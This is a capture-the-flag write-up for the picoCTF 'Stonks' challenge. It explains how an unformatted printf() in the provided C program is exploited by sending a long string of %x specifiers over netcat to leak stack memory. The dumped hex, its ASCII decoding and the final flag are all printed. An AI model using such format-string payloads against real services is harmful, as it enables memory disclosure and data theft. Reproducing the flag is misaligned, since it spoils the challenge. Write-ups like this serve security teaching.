## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`.

## Solution
- Download the c source code file `vuln.c`.
- After a a quick look, I've found out that there is a `printf()` without any type parameter specified. It means we can essentially use types ourself by our input. So let's use the `%x` to crawl up the stack and get some hex from the picoCTF memory.

So, after running the command: `nc mercury.picoctf.net 33411`, I choose to by stonks (1) and then it will ask for an api token, as we can see it should from the c source code.
Now, I will use the `%x` like so: ``%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x`` to get as much memory hex as I need.

#### Output:
``8d6d3d0804b00080489c3f7eedd80ffffffff18d6b160f7efb110f7eeddc708d6c18018d6d3b08d6d3d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffc7007df7f28af8f7efb4409ec2670010f7d8abe9f7efc0c0f7eed5c0f7eed000ffc7f818f7d7b58df7eed5c08048ecaffc7f8240f7f0ff09804b000f7eed000f7eede20ffc7f858f7f15d50f7eee8909ec26700f7eed000804b000ffc7f8588048c868d6b160ffc7f844ffc7f8588048be9f7eed3fc0ffc7f90cffc7f904118d6b1609ec26700ffc7f87000f7d30f21f7eed000f7eed0000f7d30f211ffc7f904ffc7f90cffc7f89410f7eed000f7f1070af7f280000f7eed000007f8a83f75667a5e7000180486300f7f15d50f7f10960804b00018048630080486628048b851ffc7f9048048cd08048d30f7f10960ffc7f8fcf7f289401ffc80e7f0ffc80eb8ffc80ec5ffc80eceffc80efdffc80f35ffc80f4cffc80f6bffc80f73020f7f00b5021f7f00000101f8bfbff61000116438048034420597f7f010008098048630b40ec40ed40fe40f17``

We can now convert this hex to ascii using a simple online hex to ascii (text) converter.
The result is this dump: ``m=°�H?~íØÿÿÿñk~û~íÜplm;ÖÓÐocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿÇ�}÷òø÷ï´@Âg�÷Ø«é÷ïÀÀ÷îÕÀ÷îÐ�ÿÇø÷×µ÷îÕÀHì¯ü@÷ðÿ	K�~í�~íâüÕ~î	ì&p~í�°�ÿÇøXHÈhÖ±`ÿÇøDÿÇøXH¾~í?ÀÿÇùÿÇùk	ì&pü�}0ò~í�~í��÷Ó!üOüÏüA~í�p¯(��÷îÐ��÷Vg¥ç�Hc�÷ñ]P÷ñ	`K�Hc�Hf(üHÐHÓüÏ(ÿÈüëüì_üìïüïßüó_üôÏüö¿ü÷0 ÷ðP!÷ð��ûÿa�CHD Y�	Hc@ì@í@þ@ñ``

As you can see, we have something that looks like a flag in this dump. ``ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿÇ�}``.
We know that the flag should start with ``picoCTF{`` and we have here ``ocip{FTC``, after a little googling I found out that this is written in the little endian order, but we need it to be in the big endian order. So I wrote a Python script that will convert the flag from LE to BE.

After using the script, we finally got the flag.

#### picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
